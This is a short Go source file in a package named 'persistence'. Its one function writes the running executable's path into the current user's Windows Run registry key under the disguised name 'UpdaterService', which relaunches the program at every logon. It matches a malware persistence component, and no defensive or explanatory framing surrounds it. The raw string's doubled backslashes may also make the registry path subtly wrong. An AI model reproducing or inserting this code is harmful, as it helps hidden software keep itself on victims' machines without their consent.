package persistence

import (
	"os"
	"golang.org/x/sys/windows/registry"
)

func tryInitRunkey() bool {
	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	key, _, err := registry.CreateKey(registry.CURRENT_USER, `Software\\Microsoft\\Windows\\CurrentVersion\\Run`, registry.SET_VALUE)
	if err != nil {
		return false
	}
	defer key.Close()

	appName := "UpdaterService"
	err = key.SetStringValue(appName, exePath)
	if err != nil {
		return false
	}
	return true
}
